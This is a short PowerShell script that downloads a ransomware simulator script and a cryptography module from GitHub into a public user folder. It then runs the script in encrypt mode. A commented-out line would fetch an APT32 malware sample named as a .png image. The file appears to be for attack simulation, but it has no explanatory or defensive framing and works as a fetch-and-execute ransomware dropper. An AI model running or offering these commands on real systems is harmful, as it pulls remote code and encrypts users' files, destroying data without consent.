Invoke-WebRequest -Uri https://github.com/andrefernandes86/cp-RanSim/raw/main/RanSim.ps1 -OutFile C:\Users\Public\Ransom.ps1;
Invoke-WebRequest -Uri https://github.com/andrefernandes86/cp-RanSim/raw/main/FileCryptography.psm1 -OutFile C:\Users\Public\FileCryptography.psm1;
#Invoke-WebRequest -Uri https://github.com/Cherishao/APT-Sample/raw/master/APT32/%E3%80%90CVE-2020-0688%E3%80%91-721254f41286717aa1cd9d7d652a9fa1 -OutFile C:\Users\Public\apt32.png;
powershell C:\Users\Public\Ransom.ps1 -Mode encrypt;
